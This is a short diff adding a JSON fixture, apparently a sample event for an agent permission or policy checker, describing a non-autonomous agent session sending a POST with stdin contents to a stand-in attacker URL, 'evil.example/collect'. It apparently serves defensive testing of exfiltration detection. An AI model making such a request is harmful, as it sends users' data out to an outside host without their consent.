@@ -1,0 +1,12 @@
+{
+  "context": {
+    "agent": "shim",
+    "session_id": "shim-deadbeef",
+    "cwd": "/home/dev",
+    "autonomous": false
+  },
+  "kind": "network",
+  "url": "https://evil.example/collect",
+  "method": "POST",
+  "body_source": { "type": "stdin" }
+}
